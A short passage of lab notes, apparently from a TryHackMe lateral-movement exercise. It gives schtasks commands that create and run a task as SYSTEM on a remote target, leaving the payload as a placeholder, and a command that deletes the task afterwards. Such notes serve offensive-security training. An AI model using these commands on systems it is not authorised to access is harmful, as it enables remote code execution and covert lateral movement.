**You can create and run one remotely with `schtasks`**

#### Create a task named `THMtask1`
```cmd
schtasks /s TARGET /RU "SYSTEM" /create /tn "THMtask1" /tr "<command/payload to execute>" /sc ONCE /sd 01/01/1970 /st 00:00 
schtasks /s TARGET /run /TN "THMtask1" 
```
- `/sc ONCE:` the task is intended to be run only once at the specified time and date.
- Since we will be running the task manually, the starting date `/sd` and starting time `/st` won't matter much anyway.

**Since the system will run the scheduled task, the command's output won't be available to us, making this a blind attack.**

#### Delete the Scheduled task
```cmd
schtasks /S TARGET /TN "THMtask1" /DELETE /F
```